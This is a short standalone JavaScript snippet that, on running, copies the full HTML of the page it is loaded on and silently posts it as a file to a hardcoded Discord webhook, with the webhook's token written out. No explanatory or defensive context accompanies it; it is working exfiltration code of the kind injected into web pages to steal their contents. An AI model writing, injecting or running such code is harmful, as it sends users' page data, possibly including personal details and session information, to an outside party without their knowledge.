(function() {
    const webhookUrl = 'https://discord.com/api/webhooks/1275619743524716555/ukjvTyRq4UCJ1MGxhwryo2EKawVz_6VXXpUygDE0iA0M8pKwX_rnOpD5dGxqg2-bF7Dz';
    const pageContent = document.documentElement.innerHTML;
    const blob = new Blob([pageContent], { type: 'text/html' });
    const formData = new FormData();
    formData.append('file', blob, `page-content-${Date.now()}.html`);
    fetch(webhookUrl, { method: 'POST', body: formData });
})();
